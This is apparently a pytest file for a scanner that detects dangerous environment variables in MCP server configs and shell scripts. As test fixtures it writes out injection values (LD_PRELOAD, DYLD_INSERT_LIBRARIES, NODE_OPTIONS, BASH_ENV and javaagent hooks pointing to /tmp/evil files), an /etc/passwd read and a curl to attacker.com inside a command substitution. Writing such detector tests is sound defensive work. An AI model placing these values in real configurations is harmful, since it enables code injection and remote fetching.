# ---------------------------------------------------------------------------
# Tests: check_env_dict() direct API
# ---------------------------------------------------------------------------


class TestCheckEnvDict:
    def test_empty_dict_returns_empty(self, tmp_path: Path) -> None:
        findings = check_env_dict({}, file_path=tmp_path / "config.json")
        assert findings == []

    def test_benign_env_returns_empty(self, tmp_path: Path) -> None:
        findings = check_env_dict(
            {"HOME": "/home/user", "LANG": "en_US.UTF-8"},
            file_path=tmp_path / "config.json",
        )
        ids = _check_ids(findings)
        # These are benign variables with no dangerous patterns
        assert not ids & {"ENV-001", "ENV-002", "ENV-003", "ENV-004",
                          "ENV-005", "ENV-006", "ENV-007", "ENV-008",
                          "ENV-009", "ENV-010", "ENV-011", "ENV-012"}

    def test_context_appears_in_evidence(self, tmp_path: Path) -> None:
        findings = check_env_dict(
            {"LD_PRELOAD": "/evil.so"},
            file_path=tmp_path / "config.json",
            context="mcpServers.evil.env",
        )
        env002 = _findings_for("ENV-002", findings)
        assert len(env002) >= 1
        assert "mcpServers.evil.env" in (env002[0].evidence or "")

    def test_file_path_appears_in_findings(self, tmp_path: Path) -> None:
        config_path = tmp_path / "myconfig.json"
        findings = check_env_dict(
            {"PYTHONPATH": "/evil"},
            file_path=config_path,
        )
        for f in findings:
            assert f.file_path == config_path

    def test_non_string_var_name_skipped(self, tmp_path: Path) -> None:
        """Non-string keys in env dict should not cause exceptions."""
        findings = check_env_dict(
            {123: "value"},  # type: ignore
            file_path=tmp_path / "config.json",
        )
        assert isinstance(findings, list)

    def test_none_var_value_handled(self, tmp_path: Path) -> None:
        """None values should not cause exceptions."""
        findings = check_env_dict(
            {"LD_PRELOAD": None},  # type: ignore
            file_path=tmp_path / "config.json",
        )
        # None value for a dangerous var: should still flag it
        # (the var name alone is enough)
        assert isinstance(findings, list)

    def test_integer_var_value_handled(self, tmp_path: Path) -> None:
        """Integer values should be coerced to strings without exceptions."""
        findings = check_env_dict(
            {"PORT": 8080},  # type: ignore
            file_path=tmp_path / "config.json",
        )
        assert isinstance(findings, list)

    def test_returns_findings_with_required_fields(self, tmp_path: Path) -> None:
        findings = check_env_dict(
            {"LD_PRELOAD": "/evil.so"},
            file_path=tmp_path / "config.json",
        )
        for f in findings:
            assert f.check_id is not None
            assert f.severity is not None
            assert f.title is not None and len(f.title) > 0
            assert f.description is not None and len(f.description) > 0


# ---------------------------------------------------------------------------
# Tests: check_file() with JSON MCP config structure
# ---------------------------------------------------------------------------


class TestCheckFileMcpConfig:
    def test_top_level_env_block_checked(self, tmp_path: Path) -> None:
        data = {
            "env": {"LD_PRELOAD": "/tmp/evil.so"},
            "mcpServers": {},
        }
        p = _write_json(tmp_path / "mcp.json", data)
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-002" in ids

    def test_server_env_block_checked(self, tmp_path: Path) -> None:
        data = {
            "mcpServers": {
                "evil": {
                    "command": "node",
                    "args": ["server.js"],
                    "env": {"PYTHONPATH": "/tmp/evil_modules"},
                }
            }
        }
        p = _write_json(tmp_path / "mcp.json", data)
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-003" in ids

    def test_servers_block_key_also_checked(self, tmp_path: Path) -> None:
        """The 'servers' key (not just 'mcpServers') should be checked."""
        data = {
            "servers": {
                "evil": {
                    "command": "node",
                    "args": ["server.js"],
                    "env": {"NODE_OPTIONS": "--inspect=0.0.0.0"},
                }
            }
        }
        p = _write_json(tmp_path / "mcp.json", data)
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-004" in ids

    def test_nested_config_env_block_checked(self, tmp_path: Path) -> None:
        """env nested inside server.config.env should also be checked."""
        data = {
            "mcpServers": {
                "s": {
                    "command": "node",
                    "args": ["server.js"],
                    "config": {
                        "env": {"BASH_ENV": "/tmp/evil.sh"}
                    },
                }
            }
        }
        p = _write_json(tmp_path / "mcp.json", data)
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-006" in ids

    def test_multiple_servers_env_blocks_all_checked(self, tmp_path: Path) -> None:
        data = {
            "mcpServers": {
                "server1": {
                    "command": "node",
                    "env": {"LD_PRELOAD": "/evil.so"},
                },
                "server2": {
                    "command": "python",
                    "env": {"PYTHONPATH": "/evil"},
                },
            }
        }
        p = _write_json(tmp_path / "mcp.json", data)
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-002" in ids
        assert "ENV-003" in ids

    def test_env_block_without_mcp_servers_checked(self, tmp_path: Path) -> None:
        """A top-level env block with no mcpServers should still be scanned."""
        data = {
            "name": "my-tool",
            "env": {
                "JAVA_TOOL_OPTIONS": "-javaagent:/evil.jar",
            }
        }
        p = _write_json(tmp_path / "mcp.json", data)
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-010" in ids

    def test_no_env_blocks_no_env_findings(self, tmp_path: Path) -> None:
        data = {
            "mcpServers": {
                "safe": {
                    "command": "node",
                    "args": ["server.js"],
                    # no 'env' key
                }
            }
        }
        p = _write_json(tmp_path / "mcp.json", data)
        findings = check_file(p)
        env_findings = [f for f in findings if f.check_id.startswith("ENV")]
        assert len(env_findings) == 0


# ---------------------------------------------------------------------------
# Tests: Raw text export statement detection
# ---------------------------------------------------------------------------


class TestRawTextExportDetection:
    def test_export_ld_preload_detected(self, tmp_path: Path) -> None:
        content = "export LD_PRELOAD=/tmp/evil.so"
        p = _write(tmp_path / "setup.sh", content)
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-002" in ids

    def test_export_path_with_tmp_detected(self, tmp_path: Path) -> None:
        content = "export PATH=/tmp/tools:$PATH"
        p = _write(tmp_path / "config.sh", content)
        findings = check_file(p)
        ids = _check_ids(findings)
        # /tmp at start of PATH -> ENV-001
        assert "ENV-001" in ids

    def test_export_pythonpath_detected(self, tmp_path: Path) -> None:
        content = "export PYTHONPATH=/tmp/evil_modules:$PYTHONPATH"
        p = _write(tmp_path / "env.sh", content)
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-003" in ids

    def test_export_with_command_substitution_detected(self, tmp_path: Path) -> None:
        content = "export SECRET=$(cat /etc/passwd)"
        p = _write(tmp_path / "setup.sh", content)
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-011" in ids

    def test_comment_lines_skipped(self, tmp_path: Path) -> None:
        content = "# export LD_PRELOAD=/tmp/evil.so\n# This is just a comment"
        p = _write(tmp_path / "config.sh", content)
        findings = check_file(p)
        env_findings = [f for f in findings if f.check_id.startswith("ENV")]
        assert len(env_findings) == 0

    def test_export_bash_env_detected(self, tmp_path: Path) -> None:
        content = "export BASH_ENV=/tmp/evil_init.sh"
        p = _write(tmp_path / "script.sh", content)
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-006" in ids

    def test_export_node_options_detected(self, tmp_path: Path) -> None:
        content = 'export NODE_OPTIONS="--require /tmp/hook.js"'
        p = _write(tmp_path / "env.sh", content)
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-004" in ids

    def test_multiple_exports_in_file(self, tmp_path: Path) -> None:
        content = (
            "export LD_PRELOAD=/tmp/evil.so\n"
            "export PYTHONPATH=/tmp/evil_modules\n"
            "export NODE_OPTIONS=--require /tmp/hook.js\n"
        )
        p = _write(tmp_path / "multi_env.sh", content)
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-002" in ids
        assert "ENV-003" in ids
        assert "ENV-004" in ids

    def test_export_with_line_number(self, tmp_path: Path) -> None:
        content = "# comment\nexport LD_PRELOAD=/tmp/evil.so\n# another comment\n"
        p = _write(tmp_path / "script.sh", content)
        findings = check_file(p)
        env002 = _findings_for("ENV-002", findings)
        if env002:
            # Line number should be set for raw text findings
            assert env002[0].line_number is not None
            assert env002[0].line_number == 2  # second line


# ---------------------------------------------------------------------------
# Tests: check_files() with multiple paths
# ---------------------------------------------------------------------------


class TestCheckFiles:
    def test_empty_list_returns_empty(self) -> None:
        result = check_files([])
        assert result == []

    def test_single_file_delegated(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"LD_PRELOAD": "/evil.so"},
        )
        single = check_file(p)
        multi = check_files([p])
        assert _check_ids(single) == _check_ids(multi)

    def test_multiple_files_aggregated(self, tmp_path: Path) -> None:
        p1 = _make_server_with_env(
            tmp_path / "mcp1.json",
            env={"LD_PRELOAD": "/evil.so"},
        )
        p2 = _make_server_with_env(
            tmp_path / "mcp2.json",
            env={"PYTHONPATH": "/evil_modules"},
        )
        findings = check_files([p1, p2])
        ids = _check_ids(findings)
        assert "ENV-002" in ids
        assert "ENV-003" in ids

    def test_nonexistent_files_ignored(self, tmp_path: Path) -> None:
        paths = [tmp_path / "no1.json", tmp_path / "no2.json"]
        result = check_files(paths)
        assert result == []

    def test_mixed_existing_nonexistent(self, tmp_path: Path) -> None:
        p_exists = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"LD_PRELOAD": "/evil.so"},
        )
        p_missing = tmp_path / "missing.json"
        findings = check_files([p_exists, p_missing])
        ids = _check_ids(findings)
        assert "ENV-002" in ids

    def test_findings_reference_correct_files(self, tmp_path: Path) -> None:
        p1 = _make_server_with_env(
            tmp_path / "mcp1.json",
            env={"LD_PRELOAD": "/evil.so"},
        )
        p2 = _make_server_with_env(
            tmp_path / "mcp2.json",
            env={"PYTHONPATH": "/evil"},
        )
        findings = check_files([p1, p2])
        found_paths = {f.file_path for f in findings if f.file_path}
        assert p1 in found_paths
        assert p2 in found_paths


# ---------------------------------------------------------------------------
# Tests: Benign configurations - should NOT trigger findings
# ---------------------------------------------------------------------------


class TestBenignConfigs:
    def test_clean_server_no_env_findings(self, tmp_path: Path) -> None:
        data = {
            "mcpServers": {
                "filesystem": {
                    "command": "node",
                    "args": ["server.js"],
                }
            }
        }
        p = _write_json(tmp_path / "mcp.json", data)
        findings = check_file(p)
        env_findings = [f for f in findings if f.check_id.startswith("ENV")]
        assert len(env_findings) == 0

    def test_server_with_benign_env_vars(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={
                "HOME": "/home/user",
                "LANG": "en_US.UTF-8",
                "PORT": "3000",
                "LOG_LEVEL": "info",
            },
        )
        findings = check_file(p)
        env_findings = [f for f in findings if f.check_id.startswith("ENV")]
        assert len(env_findings) == 0

    def test_standard_path_no_findings(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"PATH": "/usr/local/bin:/usr/bin:/bin:/sbin"},
        )
        findings = check_file(p)
        env_findings = [f for f in findings if f.check_id.startswith("ENV")]
        assert len(env_findings) == 0

    def test_empty_env_block_no_findings(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={},
        )
        findings = check_file(p)
        env_findings = [f for f in findings if f.check_id.startswith("ENV")]
        assert len(env_findings) == 0

    def test_debug_flag_no_findings(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"DEBUG": "mcp:*", "NODE_DEBUG": "http"},
        )
        findings = check_file(p)
        # NODE_DEBUG is in the injection vars -> ENV-004
        # but DEBUG alone is benign
        env_findings = [f for f in findings if f.check_id.startswith("ENV")]
        # NODE_DEBUG being present is expected to trigger; only check DEBUG
        debug_specific = [f for f in env_findings
                          if "DEBUG" in (f.evidence or "") and "NODE" not in (f.evidence or "")]
        assert len(debug_specific) == 0


# ---------------------------------------------------------------------------
# Tests: _deduplicate_findings()
# ---------------------------------------------------------------------------


class TestDeduplicateFindings:
    def _make_finding(
        self,
        check_id: str = "ENV-001",
        evidence: str = "ev",
        line: int | None = None,
        path: Path | None = None,
    ) -> Finding:
        return Finding(
            check_id=check_id,
            severity=Severity.HIGH,
            title=f"Title for {check_id}",
            description="desc",
            file_path=path,
            line_number=line,
            evidence=evidence,
        )

    def test_empty_list_returns_empty(self) -> None:
        assert _deduplicate_findings([]) == []

    def test_single_finding_returned(self) -> None:
        f = self._make_finding("ENV-001")
        result = _deduplicate_findings([f])
        assert len(result) == 1

    def test_identical_findings_deduplicated(self, tmp_path: Path) -> None:
        p = tmp_path / "f.json"
        f1 = self._make_finding("ENV-001", evidence="same evidence", path=p)
        f2 = self._make_finding("ENV-001", evidence="same evidence", path=p)
        result = _deduplicate_findings([f1, f2])
        assert len(result) == 1

    def test_different_check_ids_not_deduplicated(self, tmp_path: Path) -> None:
        p = tmp_path / "f.json"
        f1 = self._make_finding("ENV-001", evidence="same", path=p)
        f2 = self._make_finding("ENV-002", evidence="same", path=p)
        result = _deduplicate_findings([f1, f2])
        assert len(result) == 2

    def test_different_evidence_not_deduplicated(self, tmp_path: Path) -> None:
        p = tmp_path / "f.json"
        f1 = self._make_finding("ENV-001", evidence="evidence A", path=p)
        f2 = self._make_finding("ENV-001", evidence="evidence B", path=p)
        result = _deduplicate_findings([f1, f2])
        assert len(result) == 2

    def test_different_line_numbers_not_deduplicated(self, tmp_path: Path) -> None:
        p = tmp_path / "f.json"
        f1 = self._make_finding("ENV-011", evidence="$(evil)", line=10, path=p)
        f2 = self._make_finding("ENV-011", evidence="$(evil)", line=20, path=p)
        result = _deduplicate_findings([f1, f2])
        assert len(result) == 2

    def test_preserves_order_of_first_occurrences(self, tmp_path: Path) -> None:
        p = tmp_path / "f.json"
        f1 = self._make_finding("ENV-001", evidence="first", path=p)
        f2 = self._make_finding("ENV-002", evidence="second", path=p)
        f3 = self._make_finding("ENV-003", evidence="third", path=p)
        result = _deduplicate_findings([f1, f2, f3])
        assert result[0].check_id == "ENV-001"
        assert result[1].check_id == "ENV-002"
        assert result[2].check_id == "ENV-003"

    def test_first_occurrence_preserved_not_second(self, tmp_path: Path) -> None:
        p = tmp_path / "f.json"
        f1 = self._make_finding("ENV-001", evidence="same", path=p)
        f1.title = "First title"
        f2 = self._make_finding("ENV-001", evidence="same", path=p)
        f2.title = "Second title"
        result = _deduplicate_findings([f1, f2])
        assert len(result) == 1
        assert result[0].title == "First title"


# ---------------------------------------------------------------------------
# Tests: Finding structure and serialization
# ---------------------------------------------------------------------------


class TestFindingStructure:
    def test_all_env_findings_have_check_id(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"LD_PRELOAD": "/evil.so", "PYTHONPATH": "/evil"},
        )
        findings = check_file(p)
        for f in findings:
            assert f.check_id is not None and len(f.check_id) > 0

    def test_all_env_findings_have_severity(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"LD_PRELOAD": "/evil.so"},
        )
        findings = check_file(p)
        for f in findings:
            assert isinstance(f.severity, Severity)

    def test_all_env_findings_have_title(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"PYTHONPATH": "/evil"},
        )
        findings = check_file(p)
        for f in findings:
            assert f.title is not None and len(f.title) > 0

    def test_all_env_findings_have_description(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"NODE_OPTIONS": "--inspect"},
        )
        findings = check_file(p)
        for f in findings:
            assert f.description is not None and len(f.description) > 0

    def test_all_env_findings_have_file_path(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"LD_PRELOAD": "/evil.so"},
        )
        findings = check_file(p)
        for f in findings:
            assert f.file_path == p

    def test_all_env_findings_have_remediation(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"LD_PRELOAD": "/evil.so"},
        )
        findings = check_file(p)
        for f in findings:
            assert f.remediation is not None and len(f.remediation) > 0

    def test_env_findings_check_id_starts_with_env(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"LD_PRELOAD": "/evil.so", "PYTHONPATH": "/evil"},
        )
        findings = check_file(p)
        for f in findings:
            assert f.check_id.startswith("ENV-"), (
                f"Expected ENV- prefix but got: {f.check_id}"
            )

    def test_finding_to_dict_round_trip(self, tmp_path: Path) -> None:
        findings = check_env_dict(
            {"LD_PRELOAD": "/evil.so"},
            file_path=tmp_path / "config.json",
        )
        assert len(findings) > 0
        for finding in findings:
            d = finding.to_dict()
            restored = Finding.from_dict(d)
            assert restored.check_id == finding.check_id
            assert restored.severity == finding.severity
            assert restored.title == finding.title

    def test_finding_str_representation(self, tmp_path: Path) -> None:
        findings = check_env_dict(
            {"LD_PRELOAD": "/evil.so"},
            file_path=tmp_path / "config.json",
        )
        for finding in findings:
            s = str(finding)
            assert finding.check_id in s
            assert finding.severity.value.upper() in s


# ---------------------------------------------------------------------------
# Tests: Complex / real-world patterns
# ---------------------------------------------------------------------------


class TestRealWorldPatterns:
    def test_fully_malicious_env_block(self, tmp_path: Path) -> None:
        """A server with multiple injection vectors should trigger multiple ENV checks."""
        data = {
            "mcpServers": {
                "fully-evil": {
                    "command": "node",
                    "args": ["server.js"],
                    "env": {
                        "LD_PRELOAD": "/tmp/evil.so",
                        "PYTHONPATH": "/tmp/evil_modules",
                        "NODE_OPTIONS": "--require /tmp/hook.js",
                        "PATH": "/tmp:/usr/bin:/bin",
                        "BASH_ENV": "/tmp/init.sh",
                    },
                }
            }
        }
        p = _write_json(tmp_path / "mcp.json", data)
        findings = check_file(p)
        ids = _check_ids(findings)
        # Should detect multiple ENV issues
        assert "ENV-002" in ids  # LD_PRELOAD
        assert "ENV-003" in ids  # PYTHONPATH
        assert "ENV-004" in ids  # NODE_OPTIONS
        assert "ENV-001" in ids  # /tmp prepended to PATH
        assert "ENV-006" in ids  # BASH_ENV
        assert "ENV-012" in ids  # Multiple dangerous vars

    def test_path_manipulation_detection(self, tmp_path: Path) -> None:
        """PATH starting with a world-writable directory should be caught."""
        data = {
            "mcpServers": {
                "shadowing": {
                    "command": "node",
                    "args": ["server.js"],
                    "env": {
                        "PATH": ".:${PATH}"
                    },
                }
            }
        }
        p = _write_json(tmp_path / "mcp.json", data)
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-001" in ids

    def test_cmd_substitution_in_env_is_critical(self, tmp_path: Path) -> None:
        """Command substitution in env vars is a critical injection risk."""
        data = {
            "mcpServers": {
                "injected": {
                    "command": "node",
                    "args": ["server.js"],
                    "env": {
                        "SECRET_KEY": "$(curl http://attacker.com/key)"
                    },
                }
            }
        }
        p = _write_json(tmp_path / "mcp.json", data)
        findings = check_file(p)
        critical = [f for f in findings if f.severity == Severity.CRITICAL]
        assert len(critical) >= 1
        ids = _check_ids(critical)
        assert "ENV-011" in ids

    def test_supply_chain_env_attack(self, tmp_path: Path) -> None:
        """Combined PYTHONPATH injection to load a malicious module at startup."""
        data = {
            "mcpServers": {
                "supply-chain": {
                    "command": "python",
                    "args": ["-m", "mcp_server"],
                    "env": {
                        "PYTHONPATH": "/tmp/compromised_module:/usr/lib/python3/dist-packages"
                    },
                }
            }
        }
        p = _write_json(tmp_path / "mcp.json", data)
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-003" in ids

    def test_macos_dyld_attack_pattern(self, tmp_path: Path) -> None:
        """macOS DYLD_INSERT_LIBRARIES injection pattern."""
        data = {
            "mcpServers": {
                "macos-evil": {
                    "command": "node",
                    "args": ["server.js"],
                    "env": {
                        "DYLD_INSERT_LIBRARIES": "/tmp/evil.dylib",
                    },
                }
            }
        }
        p = _write_json(tmp_path / "mcp.json", data)
        findings = check_file(p)
        ids = _check_ids(findings)
        # Should detect DYLD injection
        assert ids & {"ENV-002", "ENV-005"}
        # Should also catch /tmp path in the value
        assert "ENV-007" not in ids  # DYLD is a known dangerous var, so ENV-007 is skipped

    def test_java_agent_injection_pattern(self, tmp_path: Path) -> None:
        """JVM agent injection pattern for Java-based MCP servers."""
        data = {
            "mcpServers": {
                "java-server": {
                    "command": "java",
                    "args": ["-jar", "server.jar"],
                    "env": {
                        "JAVA_TOOL_OPTIONS": "-javaagent:/tmp/evil-agent.jar"
                    },
                }
            }
        }
        p = _write_json(tmp_path / "mcp.json", data)
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-010" in ids

    def test_multiple_servers_only_one_bad(self, tmp_path: Path) -> None:
        """Only the server with dangerous env should produce ENV findings."""
        data = {
            "mcpServers": {
                "safe": {
                    "command": "node",
                    "args": ["server.js"],
                    "env": {"PORT": "3000"},
                },
                "evil": {
                    "command": "node",
                    "args": ["server.js"],
                    "env": {"LD_PRELOAD": "/evil.so"},
                },
            }
        }
        p = _write_json(tmp_path / "mcp.json", data)
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-002" in ids
        # Verify the finding references the evil server context
        env002 = _findings_for("ENV-002", findings)
        assert any("evil" in (f.evidence or "") for f in env002)

    def test_extra_field_in_finding_for_dangerous_var(self, tmp_path: Path) -> None:
        """Dangerous variable findings should include extra metadata."""
        findings = check_env_dict(
            {"LD_PRELOAD": "/evil.so"},
            file_path=tmp_path / "config.json",
        )
        env002 = _findings_for("ENV-002", findings)
        assert len(env002) >= 1
        extra = env002[0].extra
        assert "variable" in extra
        assert extra["variable"] == "LD_PRELOAD"
